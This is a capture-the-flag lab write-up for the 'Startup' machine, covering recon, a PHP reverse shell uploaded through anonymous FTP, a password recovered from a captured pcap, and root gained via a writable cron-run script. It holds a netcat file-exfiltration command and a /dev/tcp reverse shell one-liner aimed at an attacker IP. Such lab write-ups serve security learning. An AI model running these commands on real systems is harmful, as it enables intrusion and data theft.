# Startup

Notes on the CTF.

## Recon

### nmap

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.177.107
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
MAC Address: 02:8E:BB:1A:80:05 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms ip-10-10-226-145.eu-west-1.compute.internal (10.10.226.145)
```

### FTP

`notice.txt`

```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
Maya is probably a user.

`important.jpg`

### Gobuster

`gobuster dir -u 10.10.226.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

```
/files (Status: 301)
/server-status (Status: 403)
```

## Getting a shell

https://www.revshells.com/

`nc -nvlp 9001`


FTP:
`put rev.php ftp`

http://10.10.226.145/files/ftp/rev.php

https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal


```
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

## Escalatiion

### Getting info

`Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux`

`Sudo version 1.8.16`

`lennie:x:1002:1002::/home/lennie:`

https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/builder/linpeas_base.sh

`cd /incidents`

`cat suspicious.pcapng | nc 10.10.118.83 1111`

`nc -nvlp 1111 > sus.pcapng` on localhost

### Switching users

`strings sus.pcapng`

```
Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz (with SSE4.2)
Linux 5.8.0-1parrot1-amd64
Dumpcap (Wireshark) 3.2.6 (Git v3.2.6 packaged as 3.2.6-1)
Linux 5.8.0-1parrot1-amd64
}UvZ WP
^vZ Wu
y>9I
y>:P
'-;D
Bn;D
HTTP/1.1 200 OK
Date: Fri, 02 Oct 2020 17:39:24 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 155
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
\b&'
GET /favicon.ico HTTP/1.1
Host: 192.168.33.10
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
c_BCD
i_md
i_mHTTP/1.1 404 Not Found
Date: Fri, 02 Oct 2020 17:40:16 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 275
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 192.168.33.10 Port 80</address>
</body></html>
y>:I
y>;P
y>;P
y>;I
OU$@
"bK$
"bK$
"bK$
sd]+
(U%@
"bK$
GET /files/ftp/shell.php HTTP/1.1
Host: 192.168.33.10
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
in-addr
arpa
Jg-i
in-addr
arpa
prisoner
iana
hostmaster
root-servers
/cLinux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
/r 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: p
->ZkD
can't access tty; job control turned off
}UvZ WP
^vZ Wu
boot
data
home
incidents
initrd.img
initrd.img.old
lib64
lost+found
media
proc
recipe.txt
root
sbin
snap
vagrant
vmlinuz
vmlinuz.old
ls -la
O_total 96
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
drwx------   2 root     root     16384 Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
-rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
drwx------   3 root     root      4096 Oct  2 17:24 root
drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
drwxr-xr-x   2 root     root      4096 O
gICQi
Ojct  2 17:20 snap
drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
vCQD
Ok$ 
Omwhoami
www-data
}UvZ WP
	hk<
^vZ Wu
python -c "import pty;pty.spawn('/bin/bash')"
www-data@startup:/$ x
.73G
bash: cd: HOME not set
www-data@startup:/$ 
GVBP
D-Hk
EVB>
:[B>
}UvZ WP
^vZ Wu
d^F>
	_F8
*bin   etc	  initrd.img.old  media  recipe.txt  snap  usr	    vmlinuz.old
boot  home	  lib		  mnt	 root	     srv   vagrant
data  incidents   lib64		  opt	 run	     sys   var
dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz
www-data@startup:/$ 
!1T8
}VvZ WP
	hk<
^vZ Wu
^vZ Wu
}WvZ XP
0cd home
Ncd home
www-data@startup:/home$ 
.sta
OU&@
"bK$
@U'@
"bK$
(U(@
"bK$
"bK$
"bK$
"bK$
"bK$
"bK$
Qcd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ 
lennie
www-data@startup:/home$ 
cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ |
.?:MD
sudo -l
sudo -l
[sudo] password for www-data: 
@	c4ntg3t3n0ughsp1c3
6%	@
Sorry, try again.
[sudo] password for www-data: 
^/Sorry, try again.
[sudo] password for www-data: 
c4ntg3t3n0ughsp1c3
sudo: 3 incorrect password attempts
www-data@startup:/home$ |
cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuid
d:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:
www-data@startup:/home$ 
exit
exit
exit
exit
HTTP/1.1 200 OK
Date: Fri, 02 Oct 2020 17:40:21 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 152
Keep-Alive: timeout=5, max=98
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
uHni 
`QE9
[P(y
Counters provided by dumpcap
```

`c4ntg3t3n0ughsp1c3` now switch to lennie with this password.

`cd /home/lennie`

lennie is not a sudoer.

Documents
```
I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie

Shoppinglist: Cyberpunk 2077 | Milk | Dog food

Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
```

### Getting root 

scripts/planner.sh
```
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

`ls -l planner.sh`
```
-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
``` 


```
-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root root  1 Jul  3 21:48 startup_list.txt

-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root root  1 Jul  3 21:49 startup_list.txt
```

`planner.sh` must be editing `startup_list.txt` every minute as root.


`nc -nvlp 1337`

`sh -i >& /dev/tcp/10.10.118.83/1337 0>&1` goes into `/etc/print.sh`

And we get root.
